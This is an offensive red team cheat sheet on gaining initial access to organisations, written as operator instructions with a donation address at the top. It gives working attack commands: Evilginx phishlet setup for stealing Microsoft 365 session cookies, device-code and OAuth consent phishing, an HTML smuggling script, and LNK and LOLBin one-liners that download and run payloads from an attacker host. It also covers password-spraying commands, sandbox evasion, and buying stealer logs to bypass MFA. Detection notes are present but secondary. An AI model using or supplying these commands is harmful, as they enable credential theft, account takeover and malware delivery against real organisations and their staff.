# Initial Access — Red Team Operator Codex

> **☕ Found this useful?** Support the project:
> **[Buy Me a Coffee](https://www.buymeacoffee.com/NoVanity)** ·
> **ETH:** `0x3844c08bb832b086d00dbbfec128cb31bdcca838`


> **Classification:** Comprehensive initial access reference for advanced red team operations. Every technique includes MITRE ATT&CK mapping, detection signatures, OPSEC risk rating, and 2025-2026 viability assessment. Assumes OSINT/recon already completed (see Passive & Active Recon cheat sheets).
> **Last verified:** April 2026

---

## 0 — INITIAL ACCESS DECISION MATRIX

```
METHOD                       │ STEALTH  │ SUCCESS RATE │ SKILL    │ PREREQ                 │ BEST AGAINST
─────────────────────────────┼──────────┼──────────────┼──────────┼────────────────────────┼──────────────────────
ClickFix / fake CAPTCHA      │ HIGH     │ HIGH         │ LOW      │ Compromised/fake site  │ Any org (cross-platform)
AiTM phishing (PhaaS/proxy)  │ HIGH     │ HIGH         │ LOW-MED  │ Domain, TLS, phishlet  │ O365/cloud orgs
Device code OAuth phishing   │ HIGH     │ HIGH         │ LOW      │ Azure tenant target    │ Azure/Entra ID orgs
Edge device exploit (0/N-day)│ HIGH     │ HIGH         │ HIGH     │ Target runs vuln svc   │ VPN/firewall targets
Valid accounts (cred stuff)  │ MED-HIGH │ MEDIUM       │ LOW      │ Breach data/spray creds│ Orgs without MFA
Infostealer-sourced access   │ VERY HIGH│ HIGH         │ LOW      │ Stealer log access     │ Any org (bypasses MFA)
OAuth consent phishing       │ HIGH     │ MEDIUM       │ MEDIUM   │ App registration       │ O365/Google Workspace
SaaS-to-SaaS token theft     │ VERY HIGH│ MEDIUM       │ HIGH     │ SaaS vendor compromise │ Orgs with SaaS integrations
CI/CD pipeline compromise    │ VERY HIGH│ MEDIUM       │ HIGH     │ Access to CI/CD or dep │ DevOps-heavy orgs
Spearphish + payload         │ MEDIUM   │ LOW-MED      │ HIGH     │ Payload dev + evasion  │ Endpoint-heavy orgs
Supply chain compromise      │ VERY HIGH│ LOW          │ VERY HIGH│ Vendor/package access  │ High-value targets
Watering hole                │ HIGH     │ LOW          │ HIGH     │ Website compromise     │ Specific communities
DPRK IT worker infiltration  │ VERY HIGH│ HIGH         │ HIGH     │ Fake identity + laptop │ Remote-hiring orgs
DPRK Contagious Interview    │ HIGH     │ MEDIUM       │ MEDIUM   │ Fake recruiter persona │ Developers/crypto/Web3
Physical implant             │ VARIES   │ HIGH         │ MEDIUM   │ Physical access        │ Air-gapped / secure
Trusted relationship         │ HIGH     │ MEDIUM       │ MEDIUM   │ MSP/partner compromise │ Managed service clients
Mobile zero-click exploit    │ VERY HIGH│ HIGH         │ VERY HIGH│ 0-day exploit chain    │ High-value individuals

2026 REALITY:
  - Edge device exploitation is the most frequently observed initial access vector for advanced threat actors
    (Mandiant M-Trends 2025 report, covering 2024 data: exploits = 33% of initial infections,
    stolen creds = 16%, phishing = 14%, insider threat = 5% [driven by DPRK IT workers])
  - M-Trends 2026 report (covering 2025 data): exploits remain #1 at 32%; VISHING rose to #2 at 11%;
    email phishing continued sustained decline. Hand-off time between access broker and operator
    collapsed to 22 seconds median.
  - ClickFix/fake CAPTCHA is the #1 initial access method observed by Microsoft Defender Experts
    in 2025 (47% of attacks). 517% surge in H1 2025 (ESET). Entirely social-engineering-driven —
    user executes malicious PowerShell themselves, bypassing EDR/AV/email gateway.
  - AiTM phishing is industrialized: Tycoon 2FA, EvilProxy, Rockstar 2FA, and others offer PhaaS
    at $400/mo. Proxy-based AiTM = 88% of AiTM campaigns; AiTM attacks surged 46% in 2025
  - Infostealers are the #1 credential supply chain: 3.9B credentials compromised, 4.3M devices
    infected in 2024 (KELA). 1.8B credentials stolen in H1 2025 alone (800% increase, Flashpoint).
    54% of ransomware victims had corporate creds in stealer logs before attack (Verizon DBIR 2025).
    Lumma, StealC, Vidar dominate. Session cookies bypass MFA entirely.
  - Device code OAuth phishing used by Midnight Blizzard/APT29 in mass campaigns since Jan 2025
  - Macro-based payloads are DEAD for email delivery (Microsoft blocks by default since Jul 2022;
    rollout staggered: Current Channel Jul 2022, Monthly Enterprise Oct 2022, Semi-Annual Jan 2023)
  - ISO/IMG MOTW bypass is PATCHED (Nov 2022, CVE-2022-41091) — no longer reliable
  - OneNote: 120 dangerous file extensions BLOCKED (Apr 2023, Version 2304; Windows M365 only —
    NOT blocked on Mac, mobile, web, or Windows 10 app; Semi-Annual Channel: Jan 2024)
  - XLL (Excel add-in): BLOCKED by default from internet since Mar 2023 in M365 apps. Only viable
    in environments running older/unpatched Office or where policy overrides the block.
  - MFA is widespread — techniques that bypass MFA are essential
  - Cloud-native initial access (OAuth abuse, device code phishing, SaaS token theft) is dominant
  - CI/CD pipeline attacks emerged as proven cloud entry point (tj-actions Mar 2025, GhostAction Sep 2025)
  - DPRK IT worker fraud: 320+ companies infiltrated in 12 months (220% increase), deepfake interviews
  - DPRK Contagious Interview: 1,700+ malicious npm/PyPI/Go/Rust packages as of Apr 2026,
    targeting developers via fake job interviews. BeaverTail/OtterCookie/InvisibleFerret payloads.
  - Mobile zero-click exploits: Google GTIG tracked 90 zero-days exploited in 2025; mobile = primary target
  - Email auth enforcement: Microsoft Outlook rejects non-DMARC mail from bulk senders (May 2025),
    Gmail full DMARC rejection (Nov 2025)
```

---

## 1 — ATTACK INFRASTRUCTURE SETUP

```bash
# ═══════════════════════════════════════════════════════════
# DOMAIN & CERTIFICATE PREPARATION
# ═══════════════════════════════════════════════════════════
# Aged domains: Purchase 6+ months before operation (new domains = flagged)
# Categorize domain: submit to web categorization services (Fortiguard, etc.)
# Categories: Business, Technology, Cloud Services — avoid "Uncategorized"
# Lookalike domains: target-login.com, taarget.com, target-sso.com
# IDN homoglyphs: targеt.com (Cyrillic е), microsоft.com (Cyrillic о)
#   NOTE: Chrome/Edge show punycode for mixed-script and top-domain confusables,
#   but novel/uncommon targets may still render normally. Firefox uses a more
#   permissive "Moderately Restrictive" profile. Email clients and social media
#   platforms largely do NOT display punycode — homoglyphs remain effective there.
# TLS: Let's Encrypt (automated, free, legitimate cert)
# Verify: check domain against VirusTotal, urlscan.io, any.run before deployment
#
# ═══════════════════════════════════════════════════════════
# REDIRECTOR CHAINS
# ═══════════════════════════════════════════════════════════
# Never expose C2 server directly — use redirector chain:
# Target → HTTPS redirector (cloud function/VPS) → C2 server
# AWS Lambda/Azure Functions/GCP Cloud Functions as redirectors:
#   Traffic source = legitimate cloud IP ranges
#   Destination = your backend C2 (Cobalt Strike, Sliver, etc.)
# Apache mod_rewrite redirector:
# .htaccess: redirect C2 traffic, serve benign page to scanners
# Malleable C2 profiles: match legitimate traffic (Microsoft, CDN, etc.)
#
# ═══════════════════════════════════════════════════════════
# TLS / NETWORK FINGERPRINT EVASION [NEW]
# ═══════════════════════════════════════════════════════════
# Modern defenses fingerprint TLS handshakes (JA3/JA4) and HTTP/2 behavior.
# If your C2 or phishing infra has a non-browser JA3 hash, it gets flagged.
#
# JA3/JA4 fingerprinting: hash of TLS ClientHello parameters (cipher suites,
#   extensions, elliptic curves). EDR/proxy/SIEM can match against known-bad hashes.
# Evasion:
#   - Evilginx Pro (v4.3+): JA3 fingerprint masking, mimics real browser TLS
#   - Use headless Chrome/Playwright as proxy to inherit real browser JA3
#   - Cloudflare/CDN fronting: TLS terminates at CDN edge, your backend JA3 is hidden
#   - HTTP/2 fingerprinting (h2 SETTINGS frames): newer detection vector
#     Tools like curl-impersonate or tls-client libraries can mimic browser h2 behavior
# DETECTION: JA3/JA4 hash mismatch in proxy logs, unusual TLS parameters
# OPSEC: Test your infra's JA3 hash against known browser profiles before deployment
#
# ═══════════════════════════════════════════════════════════
# SMTP INFRASTRUCTURE
# ═══════════════════════════════════════════════════════════
# 2025 ENFORCEMENT CHANGE: Microsoft Outlook rejects non-SPF/DKIM/DMARC mail
#   from bulk senders (>5,000 msgs/day) since May 5, 2025 (error 550; 5.7.515).
#   Enforcement broadened over subsequent months. Gmail full DMARC rejection since Nov 2025.
#   SPF/DKIM/DMARC is now MANDATORY — without it, emails are silently dropped.
#
# Email delivery:
# Option 1: Dedicated VPS + Postfix + DKIM + SPF + DMARC (own domain) — MANDATORY configs
# Option 2: Compromised legitimate mail server (highest deliverability — bypasses all checks)
# Option 3: Cloud email API (SendGrid, Mailgun — risk of account burn)
# Option 4: Abuse M365 Direct Send (smtp.office365.com) from compromised tenant — bypasses
#   SPF alignment; used in 70+ confirmed compromises since May 2025
# Option 5: Abuse trusted SaaS notification infrastructure (e.g., Dropbox, SharePoint
#   sharing notifications) — email originates from legitimate service
# CRITICAL: Set up SPF, DKIM, DMARC on your sending domain — non-negotiable in 2026
# Warm IP: Send legitimate-looking emails for days before phishing
# GoPhish for campaign management:
#   docker run -d --name gophish -p 3333:3333 -p 8080:8080 gophish/gophish
#   Admin: https://localhost:3333 → Sending Profile → Template → Landing Page → Campaign
#
# DETECTION: Domain age check, certificate transparency logs, IP reputation, DMARC reports
# OPSEC: Separate infrastructure per operation — never reuse domains/IPs across targets
```

---

## 2 — PHISHING: CREDENTIAL THEFT & SESSION HIJACK

```bash
# ═══════════════════════════════════════════════════════════
# AiTM PHISHING — BYPASS MFA (T1566.002 + T1539)
# ═══════════════════════════════════════════════════════════
# NOTE: MITRE mapping corrected. T1557 (Adversary-in-the-Middle) refers to network-level
#   MitM (LLMNR/NBNS poisoning, ARP spoofing). Web-based AiTM phishing is properly mapped
#   to T1566.002 (Spearphishing Link) + T1539 (Steal Web Session Cookie).
#
# PRIMARY TECHNIQUE for 2025-2026 — steals session tokens, bypasses most MFA types.
# AiTM attacks surged 46% in 2025. Proxy-based AiTM = 88% of all AiTM campaigns.
# Defeated by: FIDO2/passkeys with token binding, Entra ID Token Protection (GA on Windows),
#   Conditional Access device-compliance policies (require managed/compliant device),
#   and certificate-based authentication with strong certificate binding.
# CRITICAL: Token Protection only covers native desktop apps on registered Windows devices.
#   It does NOT protect browser-based sessions (where AiTM attacks like Evilginx operate),
#   nor mobile, macOS, or Linux. Token Protection alone is INSUFFICIENT against AiTM.
# In practice: most orgs have NOT deployed these mitigations yet.
#
# ─── PHISHING-AS-A-SERVICE (PhaaS) ECOSYSTEM ───
# AiTM is industrialized. Turnkey platforms available for $400/mo+:
#   Tycoon 2FA     — Most widespread PhaaS platform (Sekoia 2025); handles O365/Google
#   EvilProxy       — $400/mo subscription; pre-built phishlets, session token capture
#   Rockstar 2FA   — Telegram-based PhaaS; targets Microsoft 365
#   Sneaky 2FA     — AiTM kit targeting Microsoft 365 with obfuscated Cloudflare Turnstile
#   Mamba 2FA      — Low-cost PhaaS with Telegram C2 channel
#   W3LL Panel     — Underground marketplace; compromised 56,000+ M365 accounts
#   Greatness      — PhaaS targeting M365 with MFA bypass and session hijacking
#   NakedPages     — Customizable phishing framework with AiTM capability
#   Caffeine       — Open-registration PhaaS platform (documented 2022; operational status
#                    uncertain as of 2026 — may be defunct or rebranded)
# Nation-state operators may build custom tools; criminal operators overwhelmingly use PhaaS.
#
# ─── TOOL: EVILGINX (Reverse Proxy — captures session cookies + tokens) ───
# Open-source v3.3.0 (Apr 2024, github.com/kgretzky/evilginx2 — repo name retained):
evilginx3 -p /usr/share/evilginx/phishlets
config domain yourdomain.com
config ipv4 external <SERVER_IP>
phishlets hostname o365 login.yourdomain.com
phishlets enable o365
lures create o365
lures get-url 0
# Output: URL that proxies victim through your server to real Microsoft login
# Victim authenticates normally (including MFA) → you capture the session cookie
# Import cookie into browser → full authenticated access to victim's O365/Azure
#
# Evilginx Pro (commercial, v4.3+, breakdev.org): advanced anti-detection, JA3 fingerprint
#   masking, Cloudflare integration, auto-cert management. Significant detection evasion
#   improvements over open-source version.
#
# Additional phishlets available: google, okta, github, aws, linkedin, dropbox
# Custom phishlets: write YAML for any web application
#
# ─── TOOL: EvilnoVNC (VNC-based — harder to detect than reverse proxy) ───
# Streams real browser session via noVNC to victim — not a proxy, so no URL rewriting.
# Victim interacts with a real browser running on attacker infra.
# Advantage: defeats some proxy-aware defenses; real TLS to target site.
# Disadvantage: higher infra cost, latency, scaling challenges.
#
# ─── CONDITIONAL ACCESS BYPASS TECHNIQUES [NEW] ───
# When stolen session cookies are blocked by Conditional Access (device compliance,
# trusted location, managed browser), operators need bypass strategies:
#
# 1. Compliant device spoofing: Register a device in the target's Entra ID tenant
#    (requires compromised user with device registration rights). Mark as compliant
#    via Intune enrollment or by replaying device compliance claims.
# 2. Primary Refresh Token (PRT) theft: Extract PRT from a compromised domain-joined
#    device (stored in TPM or CloudAP plugin). PRT satisfies device compliance checks.
#    Tools: ROADtools, AADInternals (Get-AADIntUserPRTToken)
# 3. Hybrid Azure AD join abuse: Join attacker-controlled device to on-prem AD,
#    sync to Entra ID via Azure AD Connect. Device appears as legitimate hybrid join.
# 4. Trusted location abuse: VPN from IP ranges in the target's trusted locations
#    list (identified via recon). Bypasses location-based Conditional Access.
# 5. Managed browser header spoofing: Some Conditional Access policies check for
#    Intune managed browser via custom headers. Headers can be spoofed.
# 6. Token replay from compliant device: If the AiTM captures tokens from a victim
#    on a compliant device, the token may already satisfy device claims (depends on
#    whether token binding is enforced — most orgs do NOT enforce it yet).
#
# DETECTION: Device registration anomalies, PRT usage from unexpected devices,
#   Conditional Access policy audit logs, hybrid join from unusual on-prem AD
# OPSEC: PRT theft requires local admin on domain-joined device; high value but noisy
#
# DETECTION: Unusual login location, new device sign-in, phishing-resistant MFA logs
#   Entra ID: Sign-in logs → unfamiliar sign-in properties, atypical travel
#   Conditional Access: "Require compliant device" blocks stolen cookies from attacker machine
# OPSEC RATING: HIGH — victim sees real login page, real MFA prompt, real destination
#   Weakness: URL is on attacker domain (trained users may notice)

# ═══════════════════════════════════════════════════════════
# DEVICE CODE PHISHING (T1566.002 + T1528)
# ═══════════════════════════════════════════════════════════
# Abuses OAuth 2.0 device authorization grant flow (RFC 8628)
# Attacker generates a device code → victim enters it at microsoft.com/devicelogin
# Attacker receives victim's access + refresh tokens → persistent access
#
# 2025 APT USAGE: Midnight Blizzard/APT29 (Russia) launched mass campaigns starting
#   Jan 2025, impersonating US State Department officials via Signal/WhatsApp/Teams.
#   Tracked by Volexity as UTA0304 and UTA0307. Described as "more effective at
#   successfully compromising accounts than most other targeted spear-phishing campaigns."
#   Pretext: "Join this Teams meeting" → victim enters device code → attacker gets tokens.
#   No phishing page needed — victim authenticates on legitimate microsoft.com.
#
# Tool: TokenTacticsV2 (PowerShell — actively maintained fork, v0.2.21+):
# NOTE: Original rvrsh3ll/TokenTactics is STALE. Use f-bader/TokenTacticsV2.
# Cmdlet naming changed from RefreshTo-* to Invoke-RefreshTo* in V2.
Import-Module .\TokenTactics.psd1
Get-AzureTokenFromDeviceCode -Client MSGraph
# Displays: user_code (e.g., "ABCD1234") and device_code
# Send user_code to victim with pretext: "Enter this code to access the shared document"
# Victim visits https://microsoft.com/devicelogin → enters code → authenticates
# Attacker receives tokens automatically
#
# V2 additions: Entra ID passkey login support, Continuous Access Evaluation (CAE),
#   v2 token endpoints, improved token refresh flows
#
# Tool: Device code phishing with custom app registration:
# Register app in your Azure tenant → request broad permissions
# Generate device code → phish victim → victim grants consent → tokens returned
#
# DETECTION: Sign-in logs show "Device Code" authentication method
#   Conditional Access: block device code flow via "Authentication flows" policy
#   (Entra ID → Conditional Access → Policies → Conditions → Authentication flows)
# OPSEC RATING: HIGH — victim authenticates on legitimate microsoft.com
#   Code is entered on real Microsoft page → no fake login page needed
#   Weakness: device code flow is increasingly blocked by security-conscious orgs

# ═══════════════════════════════════════════════════════════
# OAUTH / CONSENT PHISHING (T1566.002 + T1550.001)
# ═══════════════════════════════════════════════════════════
# Register malicious app in attacker-controlled Azure tenant
# Request permissions the USER can consent to (no admin needed):
#   Mail.Read, Files.ReadWrite.All, Calendars.Read, Contacts.Read
# NOTE: User.Read.All, Directory.Read.All, etc. require ADMIN consent —
#   a normal user cannot approve these. Target admin users or
#   use only user-consentable scopes for broad phishing campaigns.
# Send phishing link → victim clicks → consent prompt appears → victim approves
# Attacker app now has persistent API access to victim's data
#
# Technique: Create multi-tenant app with redirect_uri to attacker server
# Phishing URL: https://login.microsoftonline.com/common/oauth2/v2.0/authorize?
#   client_id=<ATTACKER_APP_ID>&response_type=code&redirect_uri=<ATTACKER_SERVER>
#   &scope=https://graph.microsoft.com/.default
#
# DETECTION: O365 UAL "Consent to application" events, admin consent review
#   Entra ID: "Enterprise applications" → user consent settings
# OPSEC RATING: HIGH — persistent access survives password changes
#   Weakness: consent screen shows app name + requested permissions

# ═══════════════════════════════════════════════════════════
# TRADITIONAL CREDENTIAL HARVESTING (T1566.002)
# ═══════════════════════════════════════════════════════════
# Still viable against orgs without MFA (shrinking but still exists):
# GoPhish: configure landing page → clone target login portal
# Modlishka: transparent reverse proxy (simpler than Evilginx)
./Modlishka -config modlishka.json
#
# HTML SMUGGLING (T1027.006 — bypass email gateway inspection):
# HTML email with embedded JavaScript that assembles payload client-side:
# <script>
# var b64 = "TVqQAAMAAAA..."; // Base64-encoded payload
# var raw = atob(b64);
# var arr = new Uint8Array(raw.length);
# for (var i = 0; i < raw.length; i++) arr[i] = raw.charCodeAt(i);
# var blob = new Blob([arr], {type:'application/octet-stream'});
# var a = document.createElement('a');
# a.href = URL.createObjectURL(blob);
# a.download = 'document.iso';
# document.body.appendChild(a); a.click();
# </script>
# Email filters see benign HTML — payload assembles in victim's browser
#
# QR CODE PHISHING / QUISHING (T1566.002):
# Used by Kimsuky/APT43 (North Korea) in May–June 2025 campaigns (FBI FLASH alert Jan 2026)
#   Four documented incidents targeting think tanks and government-adjacent orgs
#   Technique: shifts victim to mobile device outside EDR boundary → steals session tokens
# Embed QR code in email → bypasses URL rewriting/inspection
# QR points to AiTM proxy or credential harvest page
# Effective because: email gateways don't scan QR code content
#
# VOICE PHISHING / VISHING (T1566.004):
# M-Trends 2026 (covering 2025 data): vishing rose to #2 initial infection vector at 11%.
# Vishing attacks surged 442% in late 2024 (CrowdStrike 2025 Global Threat Report).
# SCATTERED SPIDER (UNC3944) uses vishing as primary initial access:
#   Call IT helpdesk → impersonate employee → request MFA reset or credential change
#   Deepfake voice cloning (ElevenLabs, etc.) makes impersonation highly convincing
# AI-enhanced pretexting: LLMs generate context-aware scripts for social engineering
#   calls, adapting to target's role, recent company events, and personal details
# UNC6040 (ShinyHunters-linked) used vishing to access Salesforce at ~40 major orgs (2025)
# DETECTION: Helpdesk callback verification, out-of-band identity confirmation
# OPSEC RATING: HIGH — no artifacts, no phishing pages, no email to analyze
#
# ═══════════════════════════════════════════════════════════
# CLICKFIX / FAKE CAPTCHA SOCIAL ENGINEERING [NEW] (T1204.002)
# ═══════════════════════════════════════════════════════════
# CRITICAL ADDITION: Microsoft 2025 Digital Defense Report named ClickFix the #1
# initial access method — 47% of attacks observed by Defender Experts. ESET measured
# a 517% surge in H1 2025. This technique was entirely absent from the prior version
# of this document.
#
# Mechanism: User visits compromised/attacker site → sees fake CAPTCHA/verification
#   ("Prove you're human" or "Fix this error") → site silently copies malicious
#   PowerShell/mshta command to clipboard → user is instructed to press Win+R,
#   paste (Ctrl+V), and press Enter → user self-executes the malware.
#
# Why it works:
#   - User initiates the execution themselves, bypassing EDR/AV behavioral detection
#   - No file download occurs through the browser → bypasses Safe Browsing, MOTW
#   - No email attachment → bypasses email gateway entirely (when delivered via web)
#   - Cross-platform: Windows (PowerShell/mshta), macOS (Terminal/curl), Linux (bash)
#
# Delivery vectors:
#   - Compromised websites with injected fake CAPTCHA JavaScript
#   - Malvertising (malicious ads redirect to ClickFix pages)
#   - Phishing emails with clean URLs that redirect through TDS to ClickFix page
#   - Fake Google Meet / Zoom pages ("fix your audio/video")
#   - Fake browser update prompts
#   - Fake document viewer errors ("install plugin to view PDF")
#   - Social media verification scams ("get your verified badge")
#   - TikTok videos instructing users to run "activation" commands
#
# Typical payload chain:
#   1. mshta.exe fetches remote HTA/JS file (disguised as .mp3/.jpg/.html)
#   2. HTA downloads/executes PowerShell stage 2
#   3. PowerShell fetches shellcode (often via Donut framework)
#   4. Shellcode injects into legitimate process (svchost.exe, msbuild.exe)
#   5. Final payload: Lumma Stealer, NetSupport RAT, Rhadamanthys, or custom RAT
#
# Persistence: modifies RunMRU registry key to re-execute on reboot
#
# Nation-state usage:
#   - Star Blizzard/COLDRIVER (Russia): "PhantomCaptcha" — targeted Ukrainian gov,
#     Red Cross, UNICEF via fake Zoom invitations → ClickFix → WebSocket RAT
#   - DPRK "ClickFake Interview": variant combining Contagious Interview lures
#     with ClickFix delivery → GolangGhost/PylangGhost payloads
#
# Variants (2026):
#   - CrashFix: malicious Chrome extension deliberately crashes browser, offers "fix"
#   - FileFix: instructs users to paste path into File Explorer address bar
#   - DNS-based delivery: DNS TXT record serves payload, fetched via nslookup in command
#
# DETECTION:
#   Sysmon Event ID 1: mshta.exe/powershell.exe spawned from explorer.exe (Run dialog)
#   PowerShell Script Block Logging: encoded commands from clipboard
#   RunMRU registry key modifications (HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU)
#   EDR: rapid sequence of Win+R → paste → PowerShell execution
# OPSEC RATING: HIGH — no phishing page to host, no file to deliver
#   Weakness: requires user to follow multi-step instructions; savvy users may recognize
#   Defense: PowerShell Constrained Language Mode, AppLocker/WDAC blocking mshta.exe
#
# DETECTION: Email gateway logs, phishing report analysis
# OPSEC: Domain age, SSL cert quality, and email warmup are critical for delivery
```


## 3 — PHISHING: PAYLOAD DELIVERY

```bash
# ═══════════════════════════════════════════════════════════
# 2026 PAYLOAD VIABILITY MATRIX
# ═══════════════════════════════════════════════════════════
# DEAD / UNRELIABLE:
#   VBA macros in Office docs from internet — BLOCKED by Microsoft (July 2022)
#   ISO/IMG MOTW bypass — PATCHED by Microsoft (November 2022)
#   OneNote embedded dangerous files — BLOCKED by Microsoft (April 2023)
#   .docm/.xlsm from email — Mark-of-the-Web blocks macro execution
#
# STILL VIABLE (with effort):
#   LNK files with embedded commands (+ icon spoofing)
#   DLL sideloading (signed EXE + malicious DLL in ZIP)
#   MSI packages (if AlwaysInstallElevated or user runs as admin)
#   HTML smuggling → delivers payload that bypasses email gateway
#   Browser exploit + drive-by download (rare, high-cost)
#   Trojanized installers (supply chain or watering hole delivery)
#   XLL (Excel add-in) — BLOCKED by default from internet since Mar 2023 in M365.
#     Only viable where older/unpatched Office or admin policy override exists.
#   Windows shortcut (.lnk) with LOLBin execution
#   CHM (Compiled HTML Help) — still allowed in some environments
#
# BEST CURRENT APPROACH:
#   HTML smuggling email → drops ZIP/ISO → contains signed EXE + malicious DLL (sideload)
#   Or: HTML smuggling → LNK file → LOLBin execution chain

# ═══════════════════════════════════════════════════════════
# LNK + LOLBIN EXECUTION (T1566.001 + T1204.002)
# ═══════════════════════════════════════════════════════════
# Create malicious LNK that uses LOLBins for execution:
# PowerShell:
$wsh = New-Object -ComObject WScript.Shell
$lnk = $wsh.CreateShortcut("$env:TEMP\Report.lnk")
$lnk.TargetPath = "C:\Windows\System32\mshta.exe"
$lnk.Arguments = "javascript:a=GetObject('script:http://attacker/payload.sct').Exec()"
$lnk.IconLocation = "C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE,0"
$lnk.Save()
# LNK icon shows Word document — victim clicks → mshta executes payload
#
# Alternative LOLBin chains:
# regsvr32.exe /s /n /u /i:http://attacker/file.sct scrobj.dll
# rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();GetObject("script:http://attacker/payload.sct")
# certutil -urlcache -split -f http://attacker/payload.exe %TEMP%\payload.exe && %TEMP%\payload.exe
#
# DETECTION: Sysmon Event ID 1 (mshta/regsvr32/rundll32 with network args)
#   Email gateway: LNK file detection, nested archive analysis
# OPSEC RATING: MEDIUM — LOLBins are well-known but still effective

# ═══════════════════════════════════════════════════════════
# DLL SIDELOADING PACKAGE (T1574.002 + T1566.001)
# ═══════════════════════════════════════════════════════════
# Package: signed legitimate EXE + malicious DLL (proxy DLL)
# Deliver via: HTML smuggling → ZIP, or direct ZIP attachment
#
# Process (see Persistence cheat sheet Section 2 for SharpDllProxy details):
# 1. Find signed EXE that loads a DLL from its directory (Process Monitor)
# 2. Create proxy DLL (SharpDllProxy / manual .def file)
# 3. Package signed EXE + proxy DLL + renamed original DLL in ZIP
# 4. Deliver ZIP → victim extracts → runs signed EXE → your DLL loads
#
# Common sideloading targets (signed EXEs that load DLLs from CWD):
# OneDrive updater → version.dll
# Zoom → various DLLs
# Microsoft Teams → various DLLs
# Many vendor update utilities
#
# DETECTION: Sysmon Event ID 7 (DLL loaded from unexpected path)
#   Signed EXE running from user temp/downloads directory
# OPSEC RATING: HIGH — signed EXE is trusted by EDR, DLL runs in its process space

# ═══════════════════════════════════════════════════════════
# SANDBOX EVASION (T1497)
# ═══════════════════════════════════════════════════════════
# Checks before payload execution:
# - Time-based: sleep 300 seconds → sandbox times out before payload runs
# - User interaction: require mouse click, scroll, or keypress
# - Environment: check username, domain membership, installed software
# - Hardware: check RAM (>4GB), CPU cores (>2), disk size (>60GB)
# - Network: check for internet connectivity, resolve known domains
# - Virtualization: check for VM artifacts (VMware tools, VBox additions)
# These are increasingly ineffective against modern sandboxes but still filter basic ones
```

---

## 4 — CREDENTIAL ATTACKS (T1110 + T1078)

```bash
# ═══════════════════════════════════════════════════════════
# PASSWORD SPRAYING (T1110.003)
# ═══════════════════════════════════════════════════════════
# Spray 1-2 passwords per user per hour to avoid lockout
# Use season+year+! format: Spring2026!, Summer2026!, Welcome2026!
#
# O365 / Entra ID:
# MSOLSpray — ABANDONED (no updates since ~2020). Still functional but faces increased
#   Microsoft rate limiting and Smart Lockout. Use entraspray instead for new ops.
# entraspray (modern replacement — dunderhay/entraspray, Python, Entra ID native):
python3 entraspray.py -u users.txt -p "Spring2026!" -o success.txt
# Trevorspray (distributed spray with multi-IP):
trevorspray -u users.txt -p "Spring2026!" --url https://login.microsoftonline.com
# Spray365 (with timing controls — NOTE: uses deprecated adal library, may require fixes):
python3 spray365.py spray -u users.txt -p "Spring2026!" --delay 3600
# nxc (formerly CrackMapExec):
nxc ldap dc01.target.local -u users.txt -p "Spring2026!" --continue-on-success
#
# OWA / Exchange:
Invoke-PasswordSprayOWA -ExchHostname mail.target.com -UserList users.txt -Password "Spring2026!"
# ruler (Go-based Exchange tool):
ruler --domain target.com brute --users users.txt --passwords passwords.txt
#
# VPN portals:
hydra -L users.txt -p "Spring2026!" target.com https-form-post "/remote/logincheck:username=^USER^&credential=^PASS^:Invalid"
#
# DETECTION: Event ID 4771 (Kerberos pre-auth failed) in bulk, Entra ID sign-in logs
#   Smart lockout triggers, conditional access blocks
# OPSEC: Spread across time, use multiple source IPs, respect lockout thresholds
#   Check lockout policy FIRST: nxc smb dc01 -u user -p pass --pass-pol

# ═══════════════════════════════════════════════════════════
# CREDENTIAL STUFFING (T1110.004)
# ═══════════════════════════════════════════════════════════
# Use credentials from breach databases against target's external services:
# Sources: dehashed.com, leakcheck.io, compiled breach databases
# Format: email:password pairs from breaches
# Tool: custom script or credmaster/spray365 with breach creds
# Effective because: 65-85% users reuse passwords across services
#   (Google/Harris 2019: 65%, Forbes Advisor 2024: 78%, Bitwarden 2024: 85%)
#
# DETECTION: Multiple failed logins from credential pairs, login from unusual geo
# OPSEC: Use residential proxies or distributed IPs to avoid IP-based blocking

# ═══════════════════════════════════════════════════════════
# INFOSTEALER ECOSYSTEM AS INITIAL ACCESS ENABLER [NEW] (T1078 + T1539)
# ═══════════════════════════════════════════════════════════
# Infostealers are the #1 credential supply chain feeding initial access in 2025-2026.
# This is not a single technique but an ecosystem that enables ALL other credential-based
# initial access methods (credential stuffing, session hijack, VPN access, SaaS pivot).
#
# Scale (2024-2025):
#   - 3.9 billion credentials compromised across 4.3 million devices in 2024 (KELA)
#   - 1.8 billion credentials stolen in H1 2025 alone (800% increase, Flashpoint)
#   - 54% of ransomware victims had corporate credentials in stealer logs BEFORE the attack
#     (Verizon DBIR 2025). Median time from stealer log to ransomware: 2 days.
#   - 94 billion cookies leaked on underground markets, up 74% YoY; ~20% still active
#   - Lumma Stealer alone: 394,000 Windows infections in 2 months (Microsoft, Mar-May 2025)
#
# Top families (as of early 2026, per AhnLab ASEC / KELA / Microsoft):
#   LummaC2 (Lumma Stealer) — #1 by volume. MaaS at $250-$1000/mo. Evades EDR via
#     direct syscall execution. Disrupted May 2025 (Microsoft/Cloudflare seized 2,300 domains)
#     but rebuilt within weeks. Back at scale by July 2025. ~51% of stealer logs sold.
#   StealC — #2. Comprehensive browser data extraction, session token focus.
#   Vidar — MaaS, targets browsers + email clients. Popular among entry-level actors.
#   RedLine — Declined after Operation Magnus (Oct 2024 law enforcement action) but
#     logs continue circulating. Legacy credential threat.
#   ACRStealer — Rising in 2026 trend data.
#
# What they steal (per infection):
#   - Browser-saved passwords (all browsers, all sites)
#   - Session cookies (bypass MFA entirely — this is the key threat)
#   - Autofill data (credit cards, addresses, personal info)
#   - Cryptocurrency wallet files and browser extension keys
#   - VPN client credentials (stored locally)
#   - SSH keys, FTP credentials
#   - Desktop files matching patterns (*.txt, *.doc, *wallet*, *seed*, etc.)
#   Average: 44 exposed credentials + 1,861 cookies per infected device (SpyCloud 2025)
#
# How operators use stealer logs for initial access:
#   1. Purchase logs from Telegram channels, Russian Market, or Genesis Market successors
#      Pricing: $10-$50 per corporate log, $1-$5 per consumer log
#   2. Search for target domain (e.g., "target.com") in log database
#   3. Extract: VPN credentials, O365 session cookies, SSO tokens, internal app creds
#   4. Import session cookies into browser → authenticated access without MFA
#   5. Use credentials for password spray validation, VPN access, or SaaS pivot
#
# Monitoring tools (for red team pre-engagement):
#   Hudson Rock Cavalier — Commercial stealer log intelligence
#   Flare — Stealer log monitoring, dark web credential exposure
#   SpyCloud — Enterprise credential exposure monitoring
